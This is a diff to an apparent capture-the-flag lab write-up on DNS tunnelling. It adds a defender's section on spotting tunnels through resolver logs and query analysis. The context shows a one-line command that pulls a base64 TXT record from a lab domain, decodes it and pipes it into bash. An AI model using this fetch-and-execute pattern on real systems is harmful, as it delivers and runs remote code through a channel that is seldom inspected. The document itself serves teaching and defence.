@@ -141,3 +141,7 @@ Run the script (clean using `tr` and deleting any double quotes `"`):
 Get the flag:
 
     thm@victim2:~$ dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash
+
+## Counter moves
+
+DNS is allowed almost everywhere and seldom inspected, which is the whole appeal. Resolver logging with subdomain-entropy and per-source query-rate analysis is what turns the tunnel back into evidence. The defender's view is in the blue notes on [watching the exits](https://blue.tymyrddin.dev/docs/counter/exfiltration/).
